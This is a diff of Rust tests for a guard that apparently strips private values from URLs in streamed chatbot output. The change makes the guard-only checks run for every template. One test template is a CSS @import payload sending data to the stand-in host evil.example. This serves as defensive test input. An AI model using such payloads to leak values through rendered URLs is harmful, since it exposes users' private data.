@@ -4511,8 +4511,6 @@ mod tests {
             "<style>@import url('//evil.example/?d= {b}[NAME_1]');</style>",
         ];
         for t in templates {
-            // Plain-text URLs are the engine's run rule, not the guard's.
-            let syntax = !t.starts_with("www.");
             for b in boundary_chars() {
                 let text = t.replace("{b}", &b.to_string());
                 let label = format!("{t:?} with U+{:04X}", b as u32);
@@ -4541,21 +4539,17 @@ mod tests {
                         &chatgpt_text(&out),
                         &format!("{what} (delta sse)"),
                     );
-                    if syntax {
-                        assert_no_real_value_in_urls(
-                            &guard_only(&e, &pieces),
-                            &format!("{what} (guard alone)"),
-                        );
-                    }
-                }
-                if syntax {
-                    let chars: Vec<String> = text.chars().map(String::from).collect();
-                    let refs: Vec<&str> = chars.iter().map(String::as_str).collect();
                     assert_no_real_value_in_urls(
-                        &guard_only(&e, &refs),
-                        &format!("{label} (guard alone, char by char)"),
+                        &guard_only(&e, &pieces),
+                        &format!("{what} (guard alone)"),
                     );
                 }
+                let chars: Vec<String> = text.chars().map(String::from).collect();
+                let refs: Vec<&str> = chars.iter().map(String::as_str).collect();
+                assert_no_real_value_in_urls(
+                    &guard_only(&e, &refs),
+                    &format!("{label} (guard alone, char by char)"),
+                );
             }
         }
     }
